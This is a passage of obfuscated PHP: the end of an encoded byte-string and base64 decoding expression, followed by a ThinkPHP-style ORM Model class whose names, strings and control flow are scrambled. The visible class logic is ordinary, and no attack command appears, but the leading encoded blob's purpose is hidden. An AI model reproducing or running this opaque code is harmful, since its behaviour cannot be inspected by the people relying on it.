5\344"."\xae\x52\x4\x9\x57\x79\x80\xbf\x8c\x59\xf5\x24\x51\x22\x2\x53\xaf\x4c\xf4\xcd\x5d\x7e\xfd\x64\xbd\xb\x64\xfe\x23\xb\x68\x5b\x5e\xf3\xb\xc9\xa8\x14\xf5\xe9\x1\x7e\xa1\x8d\x91"."\217\233\123\243\144\174\150\356\351\126\114\172\243\146\57\325\146\21\133\204\233\303\50\102\113\157\341\165\20\277\245\22\270\10\132\14\312\75\234\72\333\340\302\106\302"."\xe9\xa3\xd2\xcd\x6f\x80\x38\xd3\x1c\x8b\xb1\x57\x20\x2d\x59\xd9\xfb\xec\xc\xa\x20\xfc\xc1\x48\xc8\x34\x9\x66\x8c\x5c\x3f\x56\xed\xb1\x3f\x5a\xe6\x12\x4d\x1f\x2d\x19\xb\xa1\xdc".base64_decode('zNHeL7QWLO6ZXaJ9JMMWDsL+aZmiiSB5QAVuroGC28ikdP5JqzUmy8YmA+RB')."\xea\xf2\x4e\xb\xd4\x26\x7f\xc1\x33\xf\xba\xa1\xda\x92\xc\xf1\xe5\x4a\xeb\xdd\x9e\x78\x6c\x20\xcc\xad\x9a\xf2\xb\xd5\x89\xf7\x7e\xfb\x2d\x10\x2a\xfe\x11\x8e\x6e\xd6\x21\x16\x2c"."\127\171\2\335\267\164\313\340\13\4\222\165\214\344\14\212\211\226\346\330\247\26\11\6\34\57\61\60\215\16\106\135\364\114\271\60\277\152\153\275\130\300\336\63\134".strrev('hR3#OBNT[) +@J|.Ǉ@?OL>0W"')."\x68\x59\x9c\x4\xcb\x16\x24\xd3\xc2\xc2\x49\x87\x50\xce\x54\xf2\xc6\x7e\xba\x57\x38\x78\x44\x80\x8f\x15\xe9\xb0\x4d\xcc\xc5\x59\xf7\x37\x9e\x45\x33\x17\x7e\x8e\x20\x8f\x3d\x37\x92"."\370\213\267\242\350\111\313\376\132\121\64\363\176\133\121\344\375\127\342\202\252\10\75\244\51\105\50\40\277\230\57\244\265\74\255\210\232\0\256\23\356\243\242\137\224"."\x22\xc9\xa2\xce\x41\x71\xad\x84\x60\xd1\x55\x6c\x58\xd5\x5\x6c\x70\x71\x60\xb8\xee\x11\xd1\x46\xea\xcc\x50\x13\xb\x50\x9c\x6b\x54\x41\x85\x49\xf6\x66\x28\xab\x8f\x32\x68\x36\xed"."\x54\x8a\x7b\x99\xbc\xa0\x9\x59\x54\xbd\xd5\x81\x5e\x8d\x2e\x10\x3b\x53\xf4\xe9\x9\x51\x33\x18\xb\x1b\x3a\xe0\x8b\x5\xd\x25\xfb\x3b\xd8\x38\x9d\x7e\x24\xc5\xf\xdc\x3e\x7f\xe8"."\342\35\33\156\337\261\146\325\216\53\56\331\166\345\137\35\333\27\337\272\375\372\113\271\313\135\224\260\175\345\105\137\254\270\142\254\264\375\322\13\140\342\65\13\76"."\x7b\xf4\x21\xfc\x77\xdb\x2d\xeb\x3f\x5f\xf3\x4\xf4\xd6\x8b\xb2\x6c\xbb\x77\xfd\xe7\xf7\xde\xba\x63\xf9\x1d\xdb\x17\x3e\xbc\xfd\x2f\x37\x6e\xbf\x7a\x21\x75\xfe\x63\x39\xfa\x29\x3c"."\46\102\40\302\200\361\263\154\213\376\65\336\321\311\211\76\276\170\153\200\267\261\354\62\7\212\130\16\274\121\342\144\370\312\267\3\246\205\365\54\372\255\327\115\223"."\xd2\x1d\xc0\xea\xa2\x9c\x88\x6d\x83\xbb\x9d\x43\x50\x6e\x0\x21\x7e\x73\x3\xa7\x4\x5d\x26\x20\xe4\x45\x44\x6\x5\xc9\x15\x20\x14\x47\x43\x2a\x4e\x45\xa4\xc9\x12\x81\x97\x14\x2c"."\22\54\274\215\150\312\333\56\37\71\0\10\222\21\275\227\72\43\203\66\235\274\75\374\335\122\305\316\232\161\25\3\202\274\242\252\6\262\234\65\334\70\305\115\274"."\xba\x3a\x51\x1d\x4e\xe2\x3c\x64\x76\x36\x61\x29\x8e\xdd\xcd\x33\x95\xc1\xdf\xaa\x81\x1c\x52\xf2\x2a\xb0\xa7\x47\x74\xe2\x4\xfd\x9e\x7a\xa7\xfa\x42\xe1\x50\x41\x52\xab\x27\x14\x9a"."\22\10\66\142\307\220\5\311\250\224\240\25\123\220\324\72\61\320\262\277\64\157\263\307\347\57\110\203\132\62\55\62\367\147\203\223\174\255\250\225\36\277\77\60\145"."\177\255\360\65\114\342\55\101\167\255\374\344\74\233\324\351\341\60\275\140\10\51\51\52\117\13\346\140\152\232\73\66\342\145\254\307\4\342\274\32\324\243\27\13\130".base64_decode('XajbFNYowpKKoIZLC6k7mCVQ6CiTUQrG/qIO6Ta9d3yb7LLcOgtwtFiEV+6x').base64_decode('fCDsxQgwtOiIibfDhZcBKJWPCGzpOTp92EePCKeGWBohdllkjAW1Jhwmyf8D').strrev(''."\0".''."\0".'R'), 10, -8))); goto f; A˜: define($_SERVER[Ť][236], 0); define($_SERVER[Ť][237], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\x65", "\x6f\x72\x64\145\x72", "\x61\x6c\x69\x61\x73", "\150\x61\166\151\156\147", "\147\x72\157\x75\160", "\x6c\x6f\143\153", "\x64\151\x73\x74\x69\156\143\164", "\141\165\x74\x6f", "\x66\151\154\x74\145\162", "\166\x61\x6c\x69\144\x61\x74\145", "\162\x65\163\165\x6c\164", "\142\151\x6e\x64", "\x74\157\x6b\145\156"); public function __construct($Aٖڶ = '', $B = '', $D = '') { $cك =& $_SERVER[Ť]; $this->_initialize(); if (!empty($Aٖڶ)) { if (strpos($Aٖڶ, $cك[91])) { list($this->dbName, $this->name) = explode($cك[91], $Aٖڶ); } else { $this->name = $Aٖڶ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($B)) { $this->tablePrefix = $cك[33]; } elseif ($cك[33] != $B) { $this->tablePrefix = $B; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($cك[238]); } $this->db(0, empty($this->connection) ? $D : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $c =& $_SERVER[Ť]; if (empty($this->fields)) { if (think_config($c[239])) { $e = $this->dbName ? $this->dbName : think_config($c[240]); $c֜؏ = think_var_cache($c[241] . strtolower(get_path_this($e) . $c[91] . $this->name)); if ($c֜؏) { $E꧸ = think_config($c[242]); if (empty($E꧸) || $c֜؏[$c[243]] == $E꧸) { $this->fields = $c֜؏; return; } } } $this->flush(); } } public function flush() { goto Bꭦ; Bꭦ: $E =& $_SERVER[Ť]; $this->db->setModel($this->name); $fʤ釢 = $this->db->getFields($this->getTableName()); goto B񇍽; b߅ȋ: if (think_config($E[239])) { $Dң = $this->dbName ? $this->dbName : think_config($E[240]); think_var_cache($E[241] . strtolower(get_path_this($Dң) . $E[91] . $this->name), $this->fields); } goto F; B񇍽: if (!$fʤ釢) { return !1; } $this->fields = array_keys($fʤ釢); $this->fields[$E[244]] = !1; goto B갞; B갞: foreach ($fʤ釢 as $Aƣ => $f) { $eᶎӃ[$Aƣ] = $f[$E[29]]; if ($f[$E[36]]) { $this->fields[$E[245]] = $Aƣ; if ($f[$E[39]]) { $this->fields[$E[244]] = !0; } } } $this->fields[$E[246]] = $eᶎӃ; if (think_config($E[242])) { $this->fields[$E[243]] = think_config($E[242]); } goto b߅ȋ; F: } public function switchModel($DҩႿ, $eآ吻 = array()) { $cߖ =& $_SERVER[Ť]; $D = ucwords(strtolower($DҩႿ)) . $cߖ[247]; if (!class_exists($D)) { think_exception($D . think_lang($cߖ[248])); } $this->_extModel = new $D($this->name); if (!empty($eآ吻)) { foreach ($eآ吻 as $b) { $this->_extModel->setProperty($b, $this->{$b}); } } return $this->_extModel; } public function __set($Cٖ, $EҘª) { $this->data[$Cٖ] = $EҘª; } public function __get($D螓) { return isset($this->data[$D螓]) ? $this->data[$D螓] : null; } public function __isset($C̃) { return isset($this->data[$C̃]); } public function __unset($D) { unset($this->data[$D]); } public function __call($f̐Ǭ, $EŻ) { $Eڋ =& $_SERVER[Ť]; if (in_array(strtolower($f̐Ǭ), $this->methods, !0)) { $this->options[strtolower($f̐Ǭ)] = $EŻ[0]; return $this; } elseif (in_array(strtolower($f̐Ǭ), array($Eڋ[249], $Eڋ[250], $Eڋ[251], $Eڋ[252], $Eڋ[253]), !0)) { $c = isset($EŻ[0]) ? $EŻ[0] : $Eڋ[180]; $c = $this->db->parseKey($c); return $this->getField(strtoupper($f̐Ǭ) . $Eڋ[254] . $c . $Eڋ[255] . $f̐Ǭ, $Eڋ[249]); } elseif (strtolower(substr($f̐Ǭ, 0, 5)) == $Eڋ[256]) { $c = think_parse_name(substr($f̐Ǭ, 5)); $B֕[$c] = $EŻ[0]; return $this->where($B֕)->find(); } elseif (strtolower(substr($f̐Ǭ, 0, 10)) == $Eڋ[257]) { $fҝ = think_parse_name(substr($f̐Ǭ, 10)); $B֕[$fҝ] = $EŻ[0]; return $this->where($B֕)->getField($EŻ[1]); } elseif (isset($this->_scope[$f̐Ǭ])) { return $this->scope($f̐Ǭ, $EŻ[0]); } elseif (method_exists($this, $f̐Ǭ)) { array_unshift($EŻ, $f̐Ǭ); return call_user_func_array(array($this, $Eڋ[258]), $EŻ); } else { return call_user_func_array(array(parent, $f̐Ǭ), $EŻ); } } protected function call() { goto DԸ; a𣊴: $EӍҠ = call_user_func_array(array($this, $A), $A괍); if (method_exists($this, $F[262])) { $C҅ = call_user_func_array(array($this, $F[263]), array($E, $A괍, $EӍҠ)); if ($C҅) { return $C҅; } } return $EӍҠ; goto bА; cب: $E = $A; if (is_array($A)) { $E = $A[1]; $A = $A[0]; } $Bԙı = count($A괍) - 1; goto E߳; E߳: if (isset($A괍[$Bԙı]) && $A괍[$Bԙı] === $A) { think_exception(__CLASS__ . $F[4] . $A . think_lang($F[259])); return; } $A괍[] = $A; if (method_exists($this, $F[260])) { $C҅ = call_user_func_array(array($this, $F[261]), array($E, $A괍)); if (!is_null($C҅) && $C҅ !== !1) { return $C҅; } } goto a𣊴; DԸ: $F =& $_SERVER[Ť]; $A괍 = func_get_args(); $A = array_shift($A괍); goto cب; bА: } protected function _initialize() { } protected function _facade($AѪ) { $fɧ㬣 =& $_SERVER[Ť]; if (!empty($this->fields)) { foreach ($AѪ as $EَǍ => $Dٓ) { if (is_array($this->fields) && !in_array($EَǍ, $this->fields, !0)) { unset($AѪ[$EَǍ]); } elseif (is_scalar($Dٓ)) { $this->_parseType($AѪ, $EَǍ); } } } if (!empty($this->options[$fɧ㬣[264]])) { $AѪ = array_map($this->options[$fɧ㬣[264]], $AѪ); unset($this->options[$fɧ㬣[264]]); } $this->_beforeWrite($AѪ); return $AѪ; } protected function _beforeWrite(&$dÆꟼ) { } public function add($cֵ = '', $f퇡 = array(), $cӝа = false) { goto D߿; Dۍ: return $BӰ䗋; goto A; ȅ: if (!1 === $this->_beforeInsert($cֵ, $f퇡)) { return !1; } $BӰ䗋 = $this->db->insert($cֵ, $f퇡, $cӝа); if (!1 !== $BӰ䗋) { $dӑ = $this->getLastInsID(); if ($dӑ) { $cֵ[$this->getPk()] = $dӑ; $this->_after_insert($cֵ, $f퇡); return $dӑ; } $this->_after_insert($cֵ, $f퇡); } goto Dۍ; D߿: if (empty($cֵ)) { if (!empty($this->data)) { $cֵ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ť][265]); return !1; } } $f퇡 = $this->_parseOptions($f퇡); $cֵ = $this->_facade($cֵ); goto ȅ; A: } protected function _beforeInsert(&$aۤј, $Fݩ) { } protected function _after_insert($d걊, $dưآ) { } public function addAll($b, $bȸ = array(), $DЦ = false) { goto EƊ; F: foreach ($b as $Cßƌ => $F̦מ) { $b[$Cßƌ] = $this->_facade($F̦מ); } if (method_exists($this->db, $A֊[266])) { $dĶ漈 = $this->db->insertAll($b, $bȸ, $DЦ); } else { $this->startTrans(); foreach ($b as $Cßƌ => $F̦מ) { $dĶ漈 = $this->db->insert($F̦מ, $bȸ, $DЦ); } $this->commit(); } if (!1 !== $dĶ漈) { $Cµ = $this->getLastInsID(); if ($Cµ) { return $Cµ; } } goto aѯʋ޺; aѯʋ޺: return $dĶ漈; goto e; EƊ: $A֊ =& $_SERVER[Ť]; if (empty($b)) { $this->error = think_lang($A֊[265]); return !1; } $bȸ = $this->_parseOptions($bȸ); goto F; e: } public function selectAdd($DΠ = '', $a릯 = '', $f㕑 = array()) { $f簎 =& $_SERVER[Ť]; $f㕑 = $this->_parseOptions($f㕑); if (!1 === ($eؼ = $this->db->selectInsert($DΠ ? $DΠ : $f㕑[$f簎[267]], $a릯 ? $a릯 : $this->getTableName(), $f㕑))) { $this->error = think_lang($f簎[268]); return !1; } else { return $eؼ; } } public function save($E♃ = '', $eЏ = array()) { goto Eϧո; bÏ: $eЏ = $this->_parseOptions($eЏ); $a = $this->getPk(); if (!isset($eЏ[$aݛ[269]])) { if (isset($E♃[$a])) { $Bʹ[$a] = $E♃[$a]; $eЏ[$aݛ[269]] = $Bʹ; unset($E♃[$a]); } else { $this->error = think_lang($aݛ[268]); return !1; } } goto EՂ; E: if (!1 !== $Dիڿ) { if (isset($Eŷ)) { $E♃[$a] = $Eŷ; } $this->_afterUpdate($E♃, $eЏ); } return $Dիڿ; goto Bǰ; EՂ: if (is_array($eЏ[$aݛ[269]]) && isset($eЏ[$aݛ[269]][$a])) { $Eŷ = $eЏ[$aݛ[269]][$a]; } if (!1 === $this->_beforeUpdate($E♃, $eЏ)) { return !1; } $Dիڿ = $this->db->update($E♃, $eЏ); goto E; Eϧո: $aݛ =& $_SERVER[Ť]; if (empty($E♃)) { if (!empty($this->data)) { $E♃ = $this->data; $this->data = array(); } else { $this->error = think_lang($aݛ[265]); return !1; } } $E♃ = $this->_facade($E♃); goto bÏ; Bǰ: } protected function _beforeUpdate(&$Dְ, $fŭ) { } protected function _afterUpdate($Fհ, $D) { } public function delete($c݌ = array()) { goto F; Aˬ: $cʤ = $this->db->delete($c݌); if (!1 !== $cʤ) { $dۅ贄 = array(); if (isset($c菅)) { $dۅ贄[$fȜ] = $c菅; } $this->_after_delete($dۅ贄, $c݌); } return $cʤ; goto eϟ; Cヌ: if (is_numeric($c݌) || is_string($c݌)) { if (strpos($c݌, $Eǖʥ[47])) { $Bƻ[$fȜ] = array($Eǖʥ[270], $c݌); } else { $Bƻ[$fȜ] = $c݌; } $this->options[$Eǖʥ[269]] = $Bƻ; } $c݌ = $this->_parseOptions(); if (is_array($c݌[$Eǖʥ[269]]) && isset($c݌[$Eǖʥ[269]][$fȜ])) { $c菅 = $c݌[$Eǖʥ[269]][$fȜ]; } goto Aˬ; F: $Eǖʥ =& $_SERVER[Ť]; if (empty($c݌) && empty($this->options[$Eǖʥ[269]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $fȜ = $this->getPk(); goto Cヌ; eϟ: } protected function _after_delete($Fڮ, $eډ) { } public function select($Cń = array()) { goto aШ; aШ: $E񞲷 =& $_SERVER[Ť]; if (is_string($Cń) || is_numeric($Cń)) { $c = $this->getPk(); if (strpos($Cń, $E񞲷[47])) { $E[$c] = array($E񞲷[270], $Cń); } else { $E[$c] = $Cń; } $this->options[$E񞲷[269]] = $E; } elseif (!1 === $Cń) { $Cń = $this->_parseOptions(); return $E񞲷[271] . $this->db->buildSelectSql($Cń) . $E񞲷[272]; } $Cń = $this->_parseOptions(); goto F; A쵍: $this->_afterSelect($F˚, $Cń); return $F˚; goto A; F: $F˚ = $this->db->select($Cń); if (!1 === $F˚) { return !1; } if (empty($F˚)) { return null; } goto A쵍; A: } protected function _afterSelect(&$Eڋ, $B) { } public function buildSql($eδГ = array()) { $D =& $_SERVER[Ť]; $eδГ = $this->_parseOptions($eδГ); return $D[271] . $this->db->buildSelectSql($eδГ) . $D[272]; } public function optionsValue($Aǔ = null) { if (is_null($Aǔ)) { return $this->options; } elseif (is_array($Aǔ)) { $this->options = array_merge($this->options, $Aǔ); } } protected function _parseOptions($F = array()) { goto cޘǆ; bѐƪ: if (isset($F[$cգ[269]]) && is_array($F[$cգ[269]]) && !empty($Bݪ) && !isset($F[$cգ[276]]) && !isset($F[$cգ[273]])) { foreach ($F[$cգ[269]] as $F => $eߥ) { $F = trim($F); if (in_array($F, $Bݪ, !0)) { if (is_scalar($eߥ)) { $this->_parseType($F[$cգ[269]], $F); } } elseif (!is_numeric($F) && $cգ[70] != substr($F, 0, 1) && !1 === strpos($F, $cգ[91]) && !1 === strpos($F, $cգ[254]) && !1 === strpos($F, $cգ[277]) && !1 === strpos($F, $cգ[278])) { unset($F[$cգ[269]][$F]); } } } $this->_options_filter($F); return $F; goto d羥; cޘǆ: $cգ =& $_SERVER[Ť]; if (is_array($F)) { $F = array_merge($this->options, $F); } $this->options = array(); goto a; a: if (!isset($F[$cգ[273]])) { $F[$cգ[273]] = $this->getTableName(); $Bݪ = $this->fields; } else { $Bݪ = $this->getDbFields(); } if (!empty($F[$cգ[274]])) { $F[$cգ[273]] .= $cգ[50] . $F[$cգ[274]]; } $F[$cգ[275]] = $this->name; goto bѐƪ; d羥: } protected function _options_filter(&$dѾ) { } protected function _parseType(&$c, $a) { $Dѥ =& $_SERVER[Ť]; if (empty($this->options[$Dѥ[279]][$Dѥ[4] . $a])) { $dȠ = strtolower($this->fields[$Dѥ[246]][$a]); if (!1 !== strpos($dȠ, $Dѥ[280])) { } elseif (!1 === strpos($dȠ, $Dѥ[281]) && !1 !== strpos($dȠ, $Dѥ[282])) { $c[$a] = intval($c[$a]); } elseif (!1 !== strpos($dȠ, $Dѥ[283]) || !1 !== strpos($dȠ, $Dѥ[284])) { $c[$a] = floatval($c[$a]); } elseif (!1 !== strpos($dȠ, $Dѥ[285])) { $c[$a] = (bool) $c[$a]; } } } public function find($FϰŠ = array()) { goto b; D: if (!empty($this->options[$A[287]])) { return $this->returnResult($this->data, $this->options[$A[287]]); } return $this->data; goto eɡ; Ḋ: $FϰŠ = $this->_parseOptions(); $b˪ = $this->db->select($FϰŠ); if (!1 === $b˪) { return !1; } goto F; F: if (empty($b˪)) { return null; } $this->data = $b˪[0]; $this->_afterFind($this->data, $FϰŠ); goto D; b: $A =& $_SERVER[Ť]; if (is_numeric($FϰŠ) || is_string($FϰŠ)) { $bȖſ[$this->getPk()] = intval($FϰŠ); $this->options[$A[269]] = $bȖſ; } $this->options[$A[286]] = 1; goto Ḋ; eɡ: } protected function _afterFind(&$b֌ƣ, $A) { } protected function returnResult($C۫, $b = '') { $B =& $_SERVER[Ť]; if ($b) { if (is_callable($b)) { return call_user_func($b, $C۫); } switch (strtolower($b)) { case $B[288]: return json_encode($C۫); case $B[289]: return xml_encode($C۫); } } return $C۫; } public function parseFieldsMap($eΓ, $bɈ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Aࠑ => $eٳ) { if ($bɈ == 1) { if (isset($eΓ[$eٳ])) { $eΓ[$Aࠑ] = $eΓ[$eٳ]; unset($eΓ[$eٳ]); } } else { if (isset($eΓ[$Aࠑ])) { $eΓ[$eٳ] = $eΓ[$Aࠑ]; unset($eΓ[$Aࠑ]); } } } } return $eΓ; } public function setField($F܍, $eՖ = '') { if (is_array($F܍)) { $eó = $F܍; } else { $eó[$F܍] = $eՖ; } return $this->save($eó); } public function setAdd($e, $EÛ = 1) { $b솭 =& $_SERVER[Ť]; $DÈٔ = $e . $b솭[290] . $EÛ; if ($EÛ < 0) { $DÈٔ = $e . $EÛ; } return $this->setField($e, array($b솭[291], $DÈٔ)); } public function getField($a꾤, $B蔌ܛ = null) { $Aͷ =& $_SERVER[Ť]; $aҒ[$Aͷ[267]] = $a꾤; $aҒ = $this->_parseOptions($aҒ); $a꾤 = trim($a꾤); if (strpos($a꾤, $Aͷ[47])) { if (!isset($aҒ[$Aͷ[286]])) { $aҒ[$Aͷ[286]] = is_numeric($B蔌ܛ) ? $B蔌ܛ : $Aͷ[33]; } $b跿 = $this->db->select($aҒ); if (!empty($b跿)) { goto E윟; E윟: $dݯ̮ = explode($Aͷ[47], $a꾤); $a꾤 = array_keys($b跿[0]); $Aŧͣ = array_shift($a꾤); goto Eҫ; Eҫ: $Cš = array_shift($a꾤); $c߄ˏ = array(); $ȇ = count($dݯ̮); goto d͒; d͒: foreach ($b跿 as $BȺؑ݅) { $Cɸ = $BȺؑ݅[$Aŧͣ]; if (2 == $ȇ) { $c߄ˏ[$Cɸ] = $BȺؑ݅[$Cš]; } else { $c߄ˏ[$Cɸ] = is_string($B蔌ܛ) ? implode($B蔌ܛ, $BȺؑ݅) : $BȺؑ݅; } } return $c߄ˏ; goto Cا; Cا: } } else { if (!0 !== $B蔌ܛ) { $aҒ[$Aͷ[286]] = is_numeric($B蔌ܛ) ? $B蔌ܛ : 1; } if ($B蔌ܛ === $Aͷ[249]) { unset($aҒ[$Aͷ[286]]); } $BȺؑ݅ = $this->db->select($aҒ); if (!empty($BȺؑ݅)) { if ($B蔌ܛ === $Aͷ[249]) { return reset($BȺؑ݅[0]); } if (!0 !== $B蔌ܛ && 1 == $aҒ[$Aͷ[286]]) { return reset($BȺؑ݅[0]); } foreach ($BȺؑ݅ as $Eժύ) { $A䌕[] = $Eժύ[$a꾤]; } return $A䌕; } } return null; } public function create($A򲓙 = '', $a⃑ = '') { goto b衩Ћ; b衩Ћ: $f =& $_SERVER[Ť]; if (empty($A򲓙)) { $A򲓙 = $_POST; } elseif (is_object($A򲓙)) { $A򲓙 = get_object_vars($A򲓙); } if (empty($A򲓙) || !is_array($A򲓙)) { $this->error = think_lang($f[265]); return !1; } goto dηΉǅ; e: return $A򲓙; goto dޒԸ; b: if ($this->autoCheckFields) { $B = $this->getDbFields(); foreach ($A򲓙 as $F𣏕 => $EƉǄ) { if (!in_array($F𣏕, $B)) { unset($A򲓙[$F𣏕]); } elseif (MAGIC_QUOTES_GPC && is_string($EƉǄ)) { $A򲓙[$F𣏕] = stripslashes($EƉǄ); } } } $this->autoOperation($A򲓙, $a⃑); $this->data = $A򲓙; goto e; dηΉǅ: $A򲓙 = $this->parseFieldsMap($A򲓙, 0); $a⃑ = $a⃑ ? $a⃑ : (!empty($A򲓙[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$f[267]])) { $B = $this->options[$f[267]]; unset($this->options[$f[267]]); } elseif ($a⃑ == THINK_MODEL_INSERT && isset($this->insertFields)) { $B = $this->insertFields; } elseif ($a⃑ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $B = $this->updateFields; } goto a҅; a҅: if (isset($B)) { if (is_string($B)) { $B = explode($f[47], $B); } if (think_config($f[292])) { $B[] = think_config($f[293]); } foreach ($A򲓙 as $F𣏕 => $EƉǄ) { if (!in_array($F𣏕, $B)) { unset($A򲓙[$F𣏕]); } } } if (!$this->autoValidation($A򲓙, $a⃑)) { return !1; } if (!$this->autoCheckToken($A򲓙)) { $this->error = think_lang($f[294]); return !1; } goto b; dޒԸ: } public function autoCheckToken($a) { $Aջݴ =& $_SERVER[Ť]; if (isset($this->options[$Aջݴ[295]]) && !$this->options[$Aջݴ[295]]) { return !0; } if (think_config($Aջݴ[292])) { $cޠǡ = think_config($Aջݴ[293]); if (!isset($a[$cޠǡ]) || Session::get($cޠǡ)) { return !1; } list($A疌, $E󕂎޻) = explode($Aջݴ[70], $a[$cޠǡ]); if ($E󕂎޻ && Session::get($cޠǡ . $Aջݴ[91] . $A疌) === $E󕂎޻) { Session::remove($cޠǡ . $Aջݴ[91] . $A疌); return !0; } if (think_config($Aջݴ[296])) { Session::remove($cޠǡ . $Aջݴ[91] . $A疌); } return !1; } return !0; } public function regex($b, $C˭) { $aǰ΃ =& $_SERVER[Ť]; $F = array($aǰ΃[297] => $aǰ΃[298], $aǰ΃[299] => $aǰ΃[300], $aǰ΃[301] => $aǰ΃[302], $aǰ΃[303] => $aǰ΃[304], $aǰ΃[305] => $aǰ΃[306], $aǰ΃[307] => $aǰ΃[308], $aǰ΃[309] => $aǰ΃[310], $aǰ΃[284] => $aǰ΃[311], $aǰ΃[312] => $aǰ΃[313]); if (isset($F[strtolower($C˭)])) { $C˭ = $F[strtolower($C˭)]; } return preg_match($C˭, $b) === 1; } private function autoOperation(&$cȏ, $aቈ) { $d =& $_SERVER[Ť]; if (!empty($this->options[$d[314]])) { $C戋ȍ = $this->options[$d[314]]; unset($this->options[$d[314]]); } elseif (!empty($this->_auto)) { $C戋ȍ = $this->_auto; } if (isset($C戋ȍ)) { foreach ($C戋ȍ as $fƗӵ) { if (empty($fƗӵ[2])) { $fƗӵ[2] = THINK_MODEL_INSERT; } if ($aቈ == $fƗӵ[2] || $fƗӵ[2] == THINK_MODEL_BOTH) { switch (trim($fƗӵ[3])) { case $d[315]: case $d[316]: $a׼ = isset($fƗӵ[4]) ? (array) $fƗӵ[4] : array(); if (isset($cȏ[$fƗӵ[0]])) { array_unshift($a׼, $cȏ[$fƗӵ[0]]); } if ($d[315] == $fƗӵ[3]) { $cȏ[$fƗӵ[0]] = call_user_func_array($fƗӵ[1], $a׼); } else { $cȏ[$fƗӵ[0]] = call_user_func_array(array(&$this, $fƗӵ[1]), $a׼); } break; case $d[267]: $cȏ[$fƗӵ[0]] = $cȏ[$fƗӵ[1]]; break; case $d[317]: if ($d[33] === $cȏ[$fƗӵ[0]]) { unset($cȏ[$fƗӵ[0]]); } break; case $d[318]: default: $cȏ[$fƗӵ[0]] = $fƗӵ[1]; } if (!1 === $cȏ[$fƗӵ[0]]) { unset($cȏ[$fƗӵ[0]]); } } } } return $cȏ; } protected function autoValidation($aޘ, $f) { $FѮ =& $_SERVER[Ť]; if (!empty($this->options[$FѮ[319]])) { $f = $this->options[$FѮ[319]]; unset($this->options[$FѮ[319]]); } elseif (!empty($this->_validate)) { $f = $this->_validate; } if (isset($f)) { if ($this->patchValidate) { $this->error = array(); } foreach ($f as $a톳 => $e۟) { if (empty($e۟[5]) || $e۟[5] == THINK_MODEL_BOTH || $e۟[5] == $f) { if (0 == strpos($e۟[2], $FѮ[320]) && strpos($e۟[2], $FѮ[321])) { $e۟[2] = think_lang(substr($e۟[2], 2, -1)); } $e۟[3] = isset($e۟[3]) ? $e۟[3] : THINK_EXISTS_VALIDATE; $e۟[4] = isset($e۟[4]) ? $e۟[4] : $FѮ[322]; switch ($e۟[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($aޘ, $e۟)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($FѮ[33] != trim($aޘ[$e۟[0]])) { if (!1 === $this->_validationField($aޘ, $e۟)) { return !1; } } break; default: if (isset($aޘ[$e۟[0]])) { if (!1 === $this->_validationField($aޘ, $e۟)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($A, $bɓ) { if (!1 === $this->_validationFieldItem($A, $bɓ)) { if ($this->patchValidate) { $this->error[$bɓ[0]] = $bɓ[2]; } else { $this->error = $bɓ[2]; return !1; } } return; } protected function _validationFieldItem($e̾, $dϱ) { $a =& $_SERVER[Ť]; switch (strtolower(trim($dϱ[4]))) { case $a[315]: case $a[316]: $A௃ = isset($dϱ[6]) ? (array) $dϱ[6] : array(); if (is_string($dϱ[0]) && strpos($dϱ[0], $a[47])) { $dϱ[0] = explode($a[47], $dϱ[0]); } if (is_array($dϱ[0])) { foreach ($dϱ[0] as $bÒɑ) { $D[$bÒɑ] = $e̾[$bÒɑ]; } array_unshift($A௃, $D); } else { array_unshift($A௃, $e̾[$dϱ[0]]); } if ($a[315] == $dϱ[4]) { return call_user_func_array($dϱ[1], $A௃); } else { return call_user_func_array(array(&$this, $dϱ[1]), $A௃); } case $a[323]: return $e̾[$dϱ[0]] == $e̾[$dϱ[1]]; case $a[324]: if (is_string($dϱ[0]) && strpos($dϱ[0], $a[47])) { $dϱ[0] = explode($a[47], $dϱ[0]); } $F״ = array(); if (is_array($dϱ[0])) { foreach ($dϱ[0] as $bÒɑ) { $F״[$bÒɑ] = $e̾[$bÒɑ]; } } else { $F״[$dϱ[0]] = $e̾[$dϱ[0]]; } if (!empty($e̾[$this->getPk()])) { $F״[$this->getPk()] = array($a[325], $e̾[$this->getPk()]); } if ($this->where($F״)->find()) { return !1; } return !0; default: return $this->check($e̾[$dϱ[0]], $dϱ[1], $dϱ[4]); } } public function check($fЄ, $E, $cΫ = "\x72\x65\147\145\x78") { $d =& $_SERVER[Ť]; $cΫ = strtolower(trim($cΫ)); switch ($cΫ) { case $d[7]: case $d[326]: $C؉ = is_array($E) ? $E : explode($d[47], $E); return $cΫ == $d[7] ? in_array($fЄ, $C؉) : !in_array($fЄ, $C؉); case $d[327]: case $d[328]: if (is_array($E)) { $AĈ = $E[0]; $fѠ = $E[1]; } else { list($AĈ, $fѠ) = explode($d[47], $E); } return $cΫ == $d[327] ? $fЄ >= $AĈ && $fЄ <= $fѠ : $fЄ < $AĈ || $fЄ > $fѠ; case $d[329]: case $d[330]: return $cΫ == $d[329] ? $fЄ == $E : $fЄ != $E; case $d[331]: $Aƣ = mb_strlen($fЄ, $d[332]); if (strpos($E, $d[47])) { list($AĈ, $fѠ) = explode($d[47], $E); return $Aƣ >= $AĈ && $Aƣ <= $fѠ; } else { return $Aƣ == $E; } case $d[333]: list($DĂϭ, $aᴔ϶) = explode($d[47], $E); if (!is_numeric($DĂϭ)) { $DĂϭ = strtotime($DĂϭ); } if (!is_numeric($aᴔ϶)) { $aᴔ϶ = 